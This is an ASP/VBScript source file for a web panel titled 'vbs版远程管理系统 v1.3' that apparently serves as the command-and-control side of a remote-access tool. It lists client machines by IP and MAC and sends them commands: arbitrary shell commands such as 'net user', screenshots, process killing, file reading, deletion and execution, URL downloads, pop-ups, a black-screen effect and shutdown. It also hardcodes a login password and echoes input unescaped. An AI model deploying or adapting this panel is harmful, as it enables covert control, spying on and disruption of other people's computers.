<%
'++++++++++++++++++++++++++++++++++++++++++
'// 作用，服务端与客户端可视化交换界面程序 //
'++++++++++++++++++++++++++++++++++++++++++

'// 初始化配置信息 //
bg_main    ="#000000"     '主体色调
bg_main_LT ="#1F1F1F"     '主体顶部颜色
bg_main_on ="#666666"     '主机经过，导航背景
bg_window  ="#333333"     '浏览窗口眼色
'----------
cl_txt     ="#cccccc"     '默认文字颜色
ts_txt     ="#0099CC"     '特殊文字颜色
'----------
fl_disk      ="#666666"     '盘符颜色
fl_disk_on   ="#666666"     '盘符颜色
fl_folder    ="#FFCC33"     '盘符颜色
fl_folder_on ="#FF9933"     '盘符颜色
fl_file      ="#999999"     '超链接颜色
fl_file_on   ="#cccccc"     '超链接经过、选中
'----------
sys_password ="uwish"
%>


<%
'=++++++++++++++++++++++++++++++++++++++++=
On error resume next
Dim conns,connstr,mdbs
'############  Access数据库连接字符串  ###########
    mdbs=Rpath&"host.mdb"           '数据库文件目录
    Connstr="DRIVER=Microsoft Access Driver (*.mdb);DBQ="+server.mappath(mdbs)
Set Conn=Server.CreateObject("ADODB.Connection") 
    conn.Open connstr
'------------------------------------------==
 If Err Then
    Err.Clear
    Set Conns = Nothing
    Response.Write "err!"
    Response.End
 End If
'=++++++++++++++++++++++++++++++++++++++++=
%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<style>
body{
margin:0;
overflow:auto;
overflow-x:hidden;
background-color:<%=bg_window%>;
SCROLLBAR-BASE-COLOR:<%=bg_main%>;
SCROLLBAR-ARROW-COLOR:<%=bg_main%>;
SCROLLBAR-FACE-COLOR:<%=bg_window%>;
SCROLLBAR-SHADOW-COLOR:<%=bg_window%>;
SCROLLBAR-DARK-SHADOW-COLOR:<%=bg_window%>;
SCROLLBAR-HIGHLIGHT-COLOR:<%=bg_window%>;
}

body,table,tr,td,div{
color:<%=cl_txt%>;
font-size:11px;}


.main_bg{background-color:<%=bg_main%>;}
.ts_txt{color:<%=ts_txt%>;}

a{color:<%=fl_file%>; text-decoration:none;
font-family:Verdana, Arial, Helvetica, sans-serif}
a:hover{color:<%=fl_file_on%>;}


.disk{}
.disk a{font-size:10px;margin:1px;padding-left:15px;padding-right:15px;float:left;text-decoration:none;color:<%=fl_disk%>;}
.disk a:hover{background-color:<%=bg_main%>;color:<%=fl_disk_on%>;}
.disk .on{background-color:<%=bg_main%>;color:<%=fl_disk_on%>;}
.folder{float:left;width:100%}

.folder font{}
.folder a{ border:<%=bg_window%> 1px dotted; font-size:11px;margin:3px;padding:5px;padding-top:2px;padding-bottom:2px;float:left;text-decoration:none;width:145px;height:25px;color:<%=fl_folder%>;}
.folder a:hover{color:<%=fl_folder_on%>; border:<%=bg_main%> 1px solid; border-left:#666666 1px solid; border-top:#666666 1px solid;}

.folder_color{color:<%=fl_folder%>;}

.file{float:left;width:100%; position:relative}
.file a{ border:<%=bg_window%> 1px solid; font-size:11px;margin:1px;padding-left:5px;float:left;text-decoration:none;width:200px;}
.file a:hover{ border:<%=bg_main%> 1px solid; border-left:#666666 1px solid; border-top:#666666 1px solid;}

/*导航转到*/
.my_input{width:100%;border:1px solid #666666;color: <%=fl_file%>;background-color:<%=bg_window%>;height: 14px;font-size: 11px;}


.host{}
.host a{width:180px;height:35px;background-color:<%=bg_main%>;padding:5px;padding-top:2px;padding-bottom:2px;}
.host a:hover{background-color:<%=fl_file%>;}

/*文件操作列表*/
#col_list{position:absolute;z-index: 1000;display:block;}
#col_list a{width:80px; text-decoration:none; text-align:center}
#col_list a:hover{background-color:<%=fl_disk%>;}

/*浮动框公用属性*/
.cmd_div{position:absolute;z-index: 1000; display:none;}
</style>

<title>vbs版远程管理系统 v1.3 [卡mi.伊凡]</title>

<%

   login   =request.QueryString("login")
   if login="out" then
      session("sys_password")=""
	  response.Redirect("?")
   end if
   
   password=request.Form("password")
   if password<>"" and session("sys_password")="" then
      session("sys_password")=password
      response.Redirect("?")
   end if

if sys_password<>session("sys_password") then
   session("sys_password")=""
%>


<form id="form2" name="form2" method="post" action="">
<br />
<table border="0" align="center">
  <tr>
    <td>Go：</td>
    <td width="120"><input name="password" type="password" class="my_input" id="password" value="" /></td>
    <td width="80"><input name="Submit2" type="submit" class="my_input" value="提交" /></td>
  </tr>
</table>

</form>

<%
response.End()
end if
%>











<script> 
function nullmenu(){return false;} 
//document.oncontextmenu=nullmenu; 

//获取鼠标当前位置
function mousePos(){
return {x:document.body.scrollLeft+event.clientX,y:event.clientY};}


var show_on;  //当前div id值
     show_on="";
function showMenu(show_id){
var pos=mousePos();
if (show_on!=""){
document.getElementById(show_on).style.display='none';}
collist=document.getElementById(show_id);
collist.style.left=pos.x-5+'px';
collist.style.top =pos.y-5+'px';
collist.style.display='block';
show_on=show_id;
}



// ---  文件操作  -----------
function FileShowMenu(showId){
document.getElementById("col_list").style.display='block';
var pos=mousePos();
collist=document.getElementById(showId);
collist.style.left=pos.x-5+'px';
collist.style.top =pos.y-5+'px';
collist.style.display='block';
}

function File_M_Menus(){
document.getElementById("col_list").style.display='block';}
function File_O_Menus(){
document.getElementById("col_list").style.display='none';}


function col_over(show_id){
show_id.style.display='block';}
function col_out(show_id){
show_id.style.display='none';}


// ---  顶部文件夹函数  -----------
function Top_folder(this_id){
    this_id=document.getElementById(this_id);
if (this_id.style.display=='none'){
    this_id.style.display='block';
    }else{
	this_id.style.display='none';
	}

}
</script>




<%
Function GetLen(STR,Slen) 
         if len(STR)>Slen then
		    STR=left(STR,Slen)&"~"
		 end if
		 GetLen=STR
End Function

Function Get_Gstr(STR) 
         Get_Gstr=replace(STR," ","%20")
         Get_Gstr=replace(STR,"&","%26")
End Function



'//返回ip归属地(通过数据库查询方式)
'Function getaddress(ip)      
'if ip<>"" then
'      ipNow=cip(ip)
'  set rs_ip=server.createobject("adodb.recordset")
'      rs_ip_sql="select top 1 * from ip where (StartIPNum<=" & ipNow & " and EndIPNum>=" & ipNow & ")"
'      rs_ip.open rs_ip_sql,conn,1,1
'	  if not rs_ip.eof then
'	     getaddress=rs_ip("Country")
'	  else
'	     getaddress="Unkown!"
'	  end if
'	  rs_ip.close
'  set rs_ip=nothing
'end if
'End Function






' 访问者所在地区
' 从独立数据库读取IP信息
function cip(sip)
	tip=cstr(sip)
	sip1=left(tip,cint(instr(tip,".")-1))
	tip=mid(tip,cint(instr(tip,".")+1))
	sip2=left(tip,cint(instr(tip,".")-1))
	tip=mid(tip,cint(instr(tip,".")+1))
	sip3=left(tip,cint(instr(tip,".")-1))
	sip4=mid(tip,cint(instr(tip,".")+1))
	cip=cint(sip1)*256*256*256+cint(sip2)*256*256+cint(sip3)*256+cint(sip4)
end function


'/////////////////////////////////////////////////////////////////////


Function FSOFileRead(filename) 
  Dim objFSO,objCountFile,FiletempData 
  Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
  Set objCountFile = objFSO.OpenTextFile(Server.MapPath(filename),1,True)
  if not objCountFile.AtEndofStream then 
      FSOFileRead = objCountFile.Readall
  end if
  objCountFile.Close 
  Set objCountFile=Nothing 
  Set objFSO = Nothing 
End Function




'/////////////////////////////////////////////////////////////////////
Function getIP() 
Dim strIPAddr 
    strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR") 
 If strIPAddr = "" Then strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    getIP=strIPAddr
End Function


'/////////////////////////////////////////////////////////////////////
Function SysSaveFile(Strbody,LocalFileName) 
        On error resume next
		LocalFileName=server.MapPath(LocalFileName)
Set Fso =CreateObject("scripting.filesystemobject")
    If (Fso.fileexists(LocalFileName)) Then
    Set f =Fso.opentextfile(LocalFileName,2,true)
        f.Write Strbody
        f.Close
        Else
    Set f=Fso.opentextfile(LocalFileName,2,true)
       'f.Writeblanklines 0
        f.Write Strbody
        f.Close
    End If 
End Function

'/////////////////////////////////////////////////////////////////////
'======================================
'定义创建多层文件夹函数 -> Start <-
Function Func_Folder(strPath)
   on Error Resume Next
   Set FSO=CreateObject("Scripting.FileSystemObject")
       If FSO.FolderExists(strPath) Then Exit Function
       If Not FSO.FolderExists(FSO.GetParentFolderName(strPath)) Then 
          Func_Folder FSO.GetParentFolderName(strPath) 
       End If 
       FSO.CreateFolder strPath
   Set FSO=nothing
End Function



'/////////////////////////////////////////////////////////////////////
'======================================
'生成操作命令的函数 -> Start <-
   sysCmd =request.QueryString("sysCmd")
   if sysCmd <>"" then
      call SysSaveFile(session("mac")&"|"&sysCmd&"|","cmd.txt")
   end if
%>




<%
   code =request.QueryString("code")
if code<>"" then session("mac")  =code

   disk =request.QueryString("disk")
if disk<>"" then session("disk")  =disk

   session("disk")=replace(session("disk"),"\\","\")
   ondisk=left(session("disk"),2)

   page=request.QueryString("page")
   
   
if page="" then
%>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td height="25" style="background-color:<%=bg_main_LT%>">
<table width="100%" border="0" cellpadding="0" cellspacing="8">
  <tr>
    <td height="21" align="right">
<a hidefocus href="javascript:;" onMouseOver="showMenu('sysOther');"><font face='webdings' size='4'>@</font> 其他操作</a>
&nbsp;
<a hidefocus href="javascript:;" onMouseOver="showMenu('sysShutdown');"><font face='webdings' size='4'>i</font> 关机/重启系统</a>
&nbsp;
<a hidefocus href="javascript:;" onMouseOver="showMenu('syscmd');"><font face='webdings' size='4'>`</font>运行</a>
&nbsp;	
<a hidefocus target=ToCmd href="?Page=Page_ToCmd&sysCmd=sys_tasklist"><font face='Webdings' size='4'>L</font> 查看进程</a>
&nbsp;
<a hidefocus target=ToCmd href="?Page=Page_ToCmd&sysCmd=sys_getscreen"><font face='Webdings' size='4'>L</font> 截取屏幕</a>
&nbsp;
<a hidefocus href="javascript:;" onMouseOver="showMenu('newfile');"><font face='Wingdings' size='4'>4</font> 新建文件</a>
&nbsp;
<a href="javascript:Top_folder('Menuleft');"><font face='wingdings' size='4'>1</font> 文件夹</a>
&nbsp;
<a hidefocus href="?login=out"><font face='Webdings' size='4'>L</font> 退出</a>
&nbsp;
</td>
    <td width="330" align="right"><table width="300" border="0" cellpadding="0" cellspacing="2" class="main_bg">
      <form name="ondir">
        <tr>
          <td width="28" align="center"><font face='wingdings' size='2' class="folder_color">1</font></td>
          <td width="250">
<input name="disk" type="text" class="my_input" style="padding-left:6px; width:210px;" id="disk" value="<%=session("disk")%>" />
<input type="button" class="my_input" style="padding-left:6px; width:30px;" value="&gt;&gt;" onclick="window.parent.frames['ToCmd'].location.href='?Page=Page_ToCmd&sysCmd=sys_dir&sysCmdStr='+disk.value+'&disk='+disk.value;" />
</td>
        </tr>
      </form>
    </table></td>
  </tr>
  <tr>
    <td colspan="2">&nbsp;</td>
    </tr>
</table></td>
  </tr>
  
  <tr>
    <td height="10" valign="bottom" style="background-color:<%=bg_main_LT%>">
<div class="disk" style="border-bottom:1px #000000 solid; float:left; width:100%; padding-left:1px;">
<h5>
<%if session("mac")<>"" then%>
<a hidefocus href="javascript:void(0);" style="padding:7px;">
&nbsp;
HOST：<%=session("host")%> | 
MAC：<%=session("mac")%> | 
IP：<%=session("ip")%> | 
TIME：<%=session("update_time")%>
&nbsp;
</a>



<%
   disks=session("disks")
   disks=split(disks,"|")
for i=0 to ubound(disks) 
   if disks(i)<>"" then
if ondisk=disks(i) then
if len(session("Lpath"))<=2 then
   session("Lpath")=session("disk")&"\"
else
   session("Lpath")=session("disk")
end if
   
    response.Write("<a hidefocus id='nav_"&i&"' onclick=""nav(this);"" target=ToCmd href='?Page=Page_ToCmd&sysCmd=sys_dir&sysCmdStr="&disks(i)&"\&disk="&disks(i)&"\' class='on'>&nbsp;<font face='wingdings' size='5'><</font>&nbsp;"&disks(i)&"</a>")
else
    response.Write("<a hidefocus id='nav_"&i&"' onclick=""nav(this);"" target=ToCmd href='?Page=Page_ToCmd&sysCmd=sys_dir&sysCmdStr="&disks(i)&"\&disk="&disks(i)&"\'>&nbsp;<font face='wingdings' size='5'><</font>&nbsp;"&disks(i)&"</a>")
end if

   end if
next  
end if
%>

<script>
function nav(Sid){
for (i=0;i<10;i++){
if (document.getElementById("nav_"+i)){
document.getElementById("nav_"+i).className='';}
Sid.className='on';
}}
</script>

  </h5>
</div></td>
  </tr>
  <tr>
    <td >
<table width="100%" height="100%" border="0" align="center" cellpadding="0" cellspacing="0" class="main_bg">
  <tr>
<td width="140" valign="top" bgcolor="#2A2A2A" id="Menuleft" style="display:block">
<table width="100%" border="0" cellpadding="0" cellspacing="1" class="host">
<%
'---------------  主机  ---------------
set rs=server.createobject("adodb.recordset")
    rs_sql="select * from host order by ip desc"
    rs.open rs_sql,conn,1,1
    if rs.eof then
       session("ip")  =""
       session("mac") =""
	   session("host")=""
       session("disks")=""
       session("update_time")=""
	end if
	
    do while not rs.eof
'// 跳转到相应的主机
    id=request("id")
 if isnumeric(id) and cint(rs("id"))=cint(id) then
    session("ip")  =rs("ip")
    session("mac") =rs("mac")
	session("host")=rs("host")
    session("disks")=rs("disk")
    session("update_time")=rs("update_time")
	response.Redirect("?")
 end if

if datediff("s",rs("update_time"),now())<6 then
%>
<tr><td>
<a href="?id=<%=rs("id")%>" title="主机:<%=rs("host")%> | Ip:<%=rs("ip")%> | Mac:<%=rs("mac")%>"><font class="ts_txt" face='wingdings' size='6'>:<span style="font-size:24px;">8</span></font>&nbsp;
<%
Set S=new Search
    response.Write(S.GetCityByIP(rs("ip")))
%>
<br>&nbsp;<font class="ts_txt">HOST:</font><%=rs("host")%>
<br>&nbsp;<font class="ts_txt">IP:</font><%=rs("ip")%>
<br>&nbsp;<font class="ts_txt">MAC:</font><%=rs("mac")%>
</a>
</td></tr>
<%
end if


	rs.movenext
	loop
	rs.close
set rs=nothing
%>
</table></td>
    <td width="5" bgcolor="#2A2A2A" class="main_bg" onClick="Top_folder('Menuleft');" style="cursor:hand;"><font face="Webdings" size="2">4</font></td>
    <td valign="top">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td height="100%" valign="top">
      <iframe name="CmdBack" src="?page=Page_CmdBack" scrolling="auto" frameborder="0" width="100%" height="100%"></iframe>	</td>
    </tr>
</table></td>
  </tr>
</table>
	</td>
  </tr>
  
  <tr>
    <td height="20" >
<iframe src="?page=Page_ToCmd" name="ToCmd" scrolling="auto" frameborder="0" width="100%" height="20"></iframe>
</td>
  </tr>
</table>



<%
'//////////////// 信息返回显示页面 //////////////////////
elseif page="Page_CmdBack" then
%>



<div style="padding:10px; width:100%;">
<%
   session("times")=session("times")+1
   ServerBack=(FSOFileRead("CmdBack.txt"))
if ServerBack="" and session("times")<5 then
   response.Write("<meta http-equiv=""refresh"" content=""1"">")
   response.Write("<div align=""center"" style=""padding:60px"">正加载中...</div>")
elseif ServerBack="" and session("times")>=5 then
   session("times")=0
   response.Write("<div align=""center"" style=""padding:60px"">加载失败...</div>")
else                 '成功加载...
   session("times")=0

'开始分析返回的信息

   ServerFile=split(ServerBack,"{#}")
if ServerFile(0)=session("mac") then


'------- 信息返回处理 ---------------
   Select case lcase(ServerFile(1))%>
   
   <%case "sys_dir"%>
   
   
<!-- ++++++++++++++++++++++++++ 文件操作 +++++++++++++++++++++++++++++++ -->

<!--所有操作-->
<div id="col_list" onMouseMove="col_over(this);" onMouseOut="col_out(this);">
<table width="230" border="0" cellpadding="1" cellspacing="1" style="border:<%=bg_main_LT%> 8px solid;">
<form name="file_form" method="get" target="ToCmd">
  <tr>
<td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href='javascript:GetsCmd("file_read");'>1.
<font face='webdings' size='3'>N</font>
读 取</a></td>
    <td rowspan="6" align="center" bgcolor="<%=bg_main_LT%>">
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="1">
  <tr>
    <td height="78" align="center">
<font face='wingdings' style="font-size:50px;">2</font>
<input type="hidden" name="sysCmd" value="" /></td>
    </tr>
  <tr>
    <td><input type="text" class="my_input" name="sysfile" readonly value=""></td>
  </tr>
  <tr>
    <td><input type="text" class="my_input" name="sysCmdStr"   value=""></td>
  </tr>
  <tr>
    <td><input disabled="disabled" onClick="CheckCmd();" name="submits" type="button" class="my_input" value="请选择指令"></td>
  </tr>
</table></td>
  </tr>
  <tr>
    <td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href="javascript:GetsCmd('file_copy');">2.
<font face='webdings' size='3'>2</font>
拷 贝</a></td>
    </tr>
  <tr>

    <td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href="javascript:GetsCmd('file_rename');">3.
<font face='webdings' size='3'>q</font>
命 名</a></td>
    </tr>
  <tr>
    <td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href="javascript:GetsCmd('file_attrib');">4. 
<font face='webdings' size='3'>'</font>
属 性</a></td>
    </tr>
 
<tr><td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href="javascript:GetsCmd('file_del');">5.
<font face='webdings' size='3'>r</font>
删 除</a></td>
    </tr>
	
<tr><td width="80" bgcolor="<%=bg_main_LT%>">
<a target="ToCmd" href="javascript:GetsCmd('file_run');">6. 
<font face='webdings' size='2'>`</font>
运 行</a>
</td>
  </tr>
<input type="hidden" name="Page" value="Page_ToCmd" />
</form>
</table>
</div>
   
   

   
   
   
   
<div class="folder">
<%
'分析当前目录
 s_disk=session("disk")
 if right(s_disk,1)="\" then
    s_disk=left(s_disk,len(s_disk)-1)
 end if
 s_disk=split(s_disk,"\")
if ubound(s_disk)>=1 then
   for i=0 to ubound(s_disk)-1
       up_disk=up_disk&s_disk(i)&"\"
   next
   else
       up_disk=session("disk")
end if
   up_disk=replace(up_disk,"\","\\")   '用于js打开
%>

<%if int(len(up_disk))>4 then%>
<a href="javascript:;" onDblClick="window.parent.frames['ToCmd'].location.href='?Page=Page_ToCmd&sysCmd=sys_dir&sysCmdStr=<%=up_disk%>&disk=<%=up_disk%>';" title="上一级" target="_top">
<font face='wingdings' size='6'>1</font> ...</a>
<%
end if
response.Write("<script>window.parent.document.ondir.disk.value='"&replace(session("disk"),"\","\\\\")&"';</script>")
%>




<%
ServerFile_2=split(ServerFile(2),"|")
for i =1 to ubound(ServerFile_2)
if ServerFile_2(i)<>"" then
   todisk=session("disk")&"\"&ServerFile_2(i)
   todisk=replace(todisk,"\","\\")   '用于js打开   
%>
<a href="javascript:;" onDblClick="window.parent.frames['ToCmd'].location.href='?Page=Page_ToCmd&sysCmd=sys_dir&sysCmdStr=<%=Get_Gstr(todisk)%>&disk=<%=Get_Gstr(todisk)%>';" title="<%=ServerFile_2(i)%>" target="_top">
<font face='wingdings' size='6'>1</font>
<%=GetLen(ServerFile_2(i),6)%>
</a>
<%
end if
next
%>
</div>

<div class="file">
<%
ServerFile_3=split(ServerFile(3),"|")
for i =1 to ubound(ServerFile_3)
if ServerFile_3(i)<>"" then
   S_Files=split(ServerFile_3(i),"{s}")
'获取文件路径，用于js调用显示
   onfile =session("disk")&"\"&S_Files(0)
   onfile =replace(onfile,"\","\\")
   onfile =replace(onfile,"\\\","\\")
%>
<a href="javascript:;" onClick="Getfile('<%=onfile%>');showMenu('col_list');" title="File:<%=S_Files(0)%> (<%=S_Files(1)%>)">
<font face='wingdings' size='6'>2</font>
<%=GetLen(S_Files(0),12)%>
</a>
<%
end if
next
%>

</div>


   <%case "sys_tasklist"%>
   
<table width="450" border="0" cellpadding="1" cellspacing="0">
<%   sys_tasks=split(ServerFile(2),"{list}")
 for i=0 to ubound(sys_tasks)
  if sys_tasks(i)<>"" then
     sys_taskname=split(sys_tasks(i),"*")

     if sys_taskname(3)<>"" then
	    sys_task=int(sys_taskname(3))
'排除一些系统进程 -----------
%>
<tr
   onmouseover="this.style.backgroundColor='<%=bg_main%>';" 
   onmouseout="this.style.backgroundColor='';"><td>
   &nbsp;
   <a href="javascript:;" title="[ <%=sys_taskname(1)%> ]  <%=sys_taskname(0)%>"><%=sys_taskname(1)%></a></td>
    <td>&nbsp;<%=sys_taskname(2)%></td>
    <td>&nbsp;<%=sys_taskname(3)%></td>
    <td align="center"><%if sys_task<>0 and sys_task<>4 then%>
<a href="?page=Page_ToCmd&sysCmd=sys_killtask&sysCmdStr=<%=sys_taskname(3)%>"
	   title="确定结束 进程PID: <%=sys_taskname(1)%>" 
	   style=" line-height:1px; padding:1px;background-color:<%=bg_main%>;"
	   target="ToCmd">×</a>
	   <%end if%>
	</td>
</tr>
<%
     end if
end if:next%>
</table>

	
	
   <%case "sys_txt"%>
<pre style="font-size:12px;">
<%'=ServerFile(2)%>
<%if ServerFile(2)="已成功截图" then%>
<a href="myload/screen.jpg" target="_blank"><img src="myload/screen.jpg" width="100%" border="0" /></a>
<%else%>
<%=ServerFile(2)&now%>
<%end if%>
</pre>

   <%case "sys_msg"%>
       <%=ServerFile(2)%>
       <script>alert("<%=ServerFile(2)%>");</script>
   
   	  
   <%
   End Select


else
   response.Write("<div align=""center"" style=""padding:60px"">Welcome to my root!<br><br>Let's Run.</div>")
end if
%>



<%
end if
%>
</div>







<%
'//////////////// 发送命令处理页面 //////////////////////
elseif page="Page_ToCmd" then
          sysCmd    = request("sysCmd")
	      sysCmdStr = request("sysCmdStr")
%>
<div style="overflow:hidden">
<div style="height:20px;padding:4px;border-top:<%=bg_main%> 1px solid; background-color:<%=bg_main_LT%>">
<%
	   if sysCmd<>"" and session("mac")<>"" then
	      call SysSaveFile("","CmdBack.txt")
	      call SysSaveFile(session("mac")&"|"&sysCmd&"|"&sysCmdStr,"cmd.txt")
		  response.Write(">> 已发送指令! "&sysCmdStr)
		  response.Write("<script>window.parent.frames[""CmdBack""]")
		  response.Write(".location.reload();</script>")       '刷新指定框架
		  
	   elseif sysCmd<>"" and session("mac")="" then
		  response.Write(">> 指令不完整,发送失败!")
	   end if
%>
</div>
</div>

<%end if%>























































<script>
function Getfile(str){
    file_form.sysfile.value=str;
	}

function GetsCmd(sCmd){
var file_forms=window.parent.frames["CmdBack"].file_form;

        if (sCmd=='file_read'){
   file_forms.submits.value="Read !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
   
} else if (sCmd=='file_copy'){
   file_forms.submits.value="Copy !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
   
} else if (sCmd=='file_rename'){
   file_forms.submits.value="Rename !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
   
} else if (sCmd=='file_attrib'){
   file_forms.submits.value="Attrib !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
   
} else if (sCmd=='file_del'){
   file_forms.submits.value="Del !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
   
} else if (sCmd=='file_run'){
   file_forms.submits.value="Run !";
   file_forms.submits.disabled="";
   file_forms.sysCmd.value=sCmd;
}
}

function CheckCmd(){
var CheckOk=1;
var CCmdStr;
var Checkforms=window.parent.frames["CmdBack"].file_form;
     CCmd   =Checkforms.sysCmd.value;
     T_CmdStr=Checkforms.sysfile.value;
	 
if (CCmd!=""||T_CmdStr!=""){
   //----------------------------------
	    if (CCmd=='file_read'){
            CCmdStr=T_CmdStr;
   
} else if (CCmd=='file_copy'){
            CCmdStr=Checkforms.sysCmdStr.value;
		if (CCmdStr!=""){
		    CCmdStr=T_CmdStr+"{_}"+CCmdStr;
			} else {
			     alert('请填写路径!');
                 CheckOk=2;    //即返回失败
			}

} else if (CCmd=='file_rename'){
            CCmdStr=Checkforms.sysCmdStr.value;
		if (CCmdStr!=""){
		    CCmdStr=T_CmdStr+"{_}"+CCmdStr;
			} else {
			     alert('请填写新名称!');
                 CheckOk=2;    //即返回失败
			}
   
} else if (CCmd=='file_attrib'){
            CCmdStr=Checkforms.sysCmdStr.value;
		if (CCmdStr!=""){
		    CCmdStr=T_CmdStr+"{_}"+CCmdStr;
			} else {
			     alert('请填写文件属性!');
                 CheckOk=2;    //即返回失败
			}

} else if (CCmd=='file_del'){
		    CCmdStr=T_CmdStr;

} else if (CCmd=='file_run'){
		    CCmdStr=T_CmdStr;

} else{
   CheckOk=2;    //即返回失败
}

if (CheckOk==1){
window.parent.frames["ToCmd"].location.href='?Page=Page_ToCmd&sysCmd='+CCmd+'&sysCmdStr='+CCmdStr;
}
   //----------------------------------
} else {
alert('参数不完整!');
}
  return false;
}
</script>




<!-- ++++++++++++++++++++++++++ 系统操作 +++++++++++++++++++++++++++++++ -->


<!--CMD命令-->
<div id="syscmd" class="cmd_div" onMouseMove="col_over(this);" onMouseOut="col_out(this);">
<table width="300" border="0" cellpadding="2" cellspacing="1" style="border:<%=bg_window%> 8px solid;">
<form method="get" action="" target="ToCmd">
  <tr>
    <td width="30" align="center" bgcolor="<%=bg_main%>">
	<font face='webdings' size='3'>`</font>	</td>
    <td width="208" bgcolor="<%=bg_main%>"><input name="sysCmdStr" type="text" class="my_input" id="C_cmd" style="background-color:<%=bg_main%>" value="net user" /></td>
    <td width="42" bgcolor="<%=bg_main%>"><input style="background-color:<%=bg_main%>" type="submit" class="my_input" value="Run !" /></td>
  </tr>
<input type="hidden" name="Page" value="Page_ToCmd" />
<input type="hidden" name="sysCmd" value="sys_cmd" />
</form>
</table>
</div>


<!--新建文件-->
<div id="newfile" class="cmd_div" onMouseMove="col_over(this);" onMouseOut="col_out(this);">
<table width="300" border="0" cellpadding="2" cellspacing="1" style="border:<%=bg_window%> 8px solid;">
<form method="get" action="" target="ToCmd">
  <tr>
    <td width="30" align="center" bgcolor="<%=bg_main%>">
<font face='Wingdings' size='3'>4</font>
	</td>
    <td width="208" bgcolor="<%=bg_main%>"><input name="sysCmdStr" type="text" class="my_input" style="background-color:<%=bg_main%>" value="http://" /></td>
    <td width="42" bgcolor="<%=bg_main%>">
<input style="background-color:<%=bg_main%>" type="submit" class="my_input" value="Add !" /></td>
  </tr>
<input type="hidden" name="Page" value="Page_ToCmd" />
<input type="hidden" name="sysCmd" value="sys_newfile" />
</form>
</table>
</div>


<!--其他操作-->
<div id="sysOther" class="cmd_div" onMouseMove="col_over(this);" onMouseOut="col_out(this);">
<table width="250" border="0" cellpadding="2" cellspacing="1" style="border:<%=bg_window%> 8px solid;">
<form method="get" action="" target="ToCmd">
  <tr>
    <td align="center" bgcolor="<%=bg_main%>">
<input onClick="sysCmdStr.value='http://';" name="sysCmd" type="radio" value="sys_openweb" checked="checked"/> 
打开网页</td>
    <td height="25" align="center" bgcolor="<%=bg_main%>">
<input onClick="sysCmdStr.value='信息提示...';" type="radio" name="sysCmd" value="sys_showmsg" /> 弹出信息</td>
    <td align="center" bgcolor="<%=bg_main%>">
<input onClick="sysCmdStr.value='黑屏警告...';" type="radio" name="sysCmd" value="sys_windowblack" /> 黑屏</td>
  </tr>
  <tr>
 <td align="center" bgcolor="<%=bg_main%>" colspan="2">
<input name="sysCmdStr" type="text" class="my_input" value="http://" />
</td>
 <td align="center" bgcolor="<%=bg_main%>">
<input style="background-color:<%=bg_main%>" name="Submit" type="submit" class="my_input" value="Go !" />
<input type="hidden" name="Page" value="Page_ToCmd" />
</td>
  </tr>
  
</form>
</table>
</div>



<!--关机/重启系统/黑屏-->
<div id="sysShutdown" class="cmd_div" onMouseMove="col_over(this);" onMouseOut="col_out(this);">
<table width="250" border="0" cellpadding="2" cellspacing="1" style="border:<%=bg_window%> 8px solid;">
<form id="form1" name="form1" method="post" action="">
  <tr>
    <td align="center" bgcolor="<%=bg_main%>">
<a hidefocus href="?sysCmd=sys_shutdown_0"><font face='webdings' size='3'>y</font> 注销</a></td>
    <td height="25" align="center" bgcolor="<%=bg_main%>">
<a hidefocus href="?sysCmd=sys_shutdown_2"><font face='webdings' size='3'>i</font> 重启系统</a></td>
    <td align="center" bgcolor="<%=bg_main%>">
<a hidefocus href="?sysCmd=sys_shutdown_8"><font face='webdings' size='3'>x</font>关机</a></td>
  </tr>
</form>
</table>
</div>


<!-- ++++++++++++++++++++++++++ 文件夹操作 +++++++++++++++++++++++++++++ -->


</div>


<%
'//返回ip归属地(通过网络查询方式)
Class Search
 Private XMLHTTP
 Private Sub Class_Initialize()
  Set XMLHTTP = Server.CreateObject("Microsoft.XMLHTTP")
 End Sub

 Public Function GetCityByIP(IP)
  DIM HTML,s,m,n,str2
  If Trim(IP) = "" then
   GetCityByIP= ""
  Else
  HTML =  SendMessage("http://www.ip38.com/index.php?ip="&IP)
  s = instr(HTML,"查询结果：") 
  m = instr(s,HTML,"</font>")
  str2 = mid(HTML,s + len(s) + 1,m - s - len(s) - 1)
  GetCityByIP = str2
  End If
 End Function


Public Function SendMessage(Url)
     On Error Resume Next  '容错模式(防止内存不足)
     Session.CodePage = 936
     Dim xmlhttp,xmlget,bgpos,endpos
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
	     strA=""
         With xmlhttp
           .Open "GET",Url,False
           .SetRequestHeader "Content-Length",len(strA)
           .SetRequestHeader "Content-Type","application/x-www-form-urlencoded"
           .Send strA
           If .status<>200 then
              SendMessage="error"
           Else
	          SendMessage=bytes2BSTR(xmlhttp.responseBody)
           End If
         End With 
 Set xmlhttp = Nothing
End Function 



 Private Function bytes2BSTR(arrBytes)
  strReturn = ""
  arrBytes = CStr(arrBytes)
  For i = 1 To LenB(arrBytes)
  ThisCharCode = AscB(MidB(arrBytes, i, 1))
  If ThisCharCode < &H80 Then
  strReturn = strReturn & Chr(ThisCharCode)
  Else
  NextCharCode = AscB(MidB(arrBytes, i+1, 1))
  strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
  i = i + 1
  End If
  Next
  bytes2BSTR = strReturn
 End Function
End Class
%>